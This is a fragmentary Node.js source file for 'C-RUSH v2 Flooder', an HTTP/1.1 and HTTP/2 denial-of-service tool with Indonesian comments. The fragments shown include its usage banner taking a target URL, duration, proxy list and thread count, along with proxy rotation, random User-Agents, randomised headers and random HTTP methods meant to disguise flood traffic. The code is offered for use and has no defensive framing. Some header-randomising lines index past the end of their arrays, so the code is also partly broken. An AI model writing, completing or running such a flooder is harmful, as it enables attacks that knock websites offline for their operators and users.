...
const options = {
    ...
    headfull: args.includes('-z'),  // Headfull mode tetap menggunakan -z
    useragent: args.includes('-u'),  // Random User-Agent menggunakan -u
    randomheader: args.includes('-r'),  // Random Header menggunakan -r
    randomproxy: args.includes('-p'),  // Menambahkan opsi -p untuk Proxy Acak
...
if (process.argv.length < 7) {
    ...
    ${colors.green(`🐍`)} C-RUSH v2 Flooder - HTTP/1.1 & HTTP/2 Mixed RushAway
        ${colors.gray(`Made with ❤️ by NIKKI/ZAI (${colors.red(`@`)}getflood/zaibuzaiii)`)}
    ...
    ${colors.gray(`-m: Enable random HTTP: GET, POST, HEAD, PUT, DELETE.`)}
    ${colors.gray(`-p: Enable random proxy selection`)}
    ${colors.gray(`-r: Enable random headers in each request`)}
    ${colors.gray(`-u: Enable random User-Agent in each request`)}
    ${colors.gray(`-z: Enable headfull requests (browser-like headers)`)}
    ...
    ${colors.gray(`node c-rush.js https://example.com 300 proxies.txt 8 20 -z -u -r -p -m -c -v 2`)}
    `));
    process.exit(1);
}
...
function getNextProxy() {
    if (proxies.length === 0) {
        console.log("❌ Tidak ada proxy yang tersedia!");
        process.exit(1);
    }

    // Ambil proxy saat ini dan pindahkan ke yang berikutnya
    const proxy = proxies[proxyIndex].split(':');
    proxyIndex = (proxyIndex + 1) % proxies.length; // Bergilir ke proxy berikutnya
...
function buildRequest() {
    ...
    const userAgent = options.useragent ? generateUserAgent() : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
...
function go() {
    ...
    return proxy[randomIndex].split(':');
}

const [proxyHost, proxyPort] = options.randomproxy ? proxies[Math.floor(Math.random() * proxies.length)].split(':') : proxy[0].split(':');
...
if (options.randomheader) {
    headers.push(['accept', ['text/html', 'application/xhtml+xml', 'application/xml;q=0.9,image/webp,*/*;q=0.8'][Math.floor(Math.random() * 3)]]);
    headers.push(['accept-encoding', ['gzip, deflate', 'br'][Math.floor(Math.random() * 3)]]);
    headers.push(['accept-language', ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.7'][Math.floor(Math.random() * 3)]]);
    headers.push(['cache-control', ['no-cache', 'max-age=0', 'no-store'][Math.floor(Math.random() * 3)]]);
    headers.push(['referer', ['https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/'][Math.floor(Math.random() * 3)]]);
}
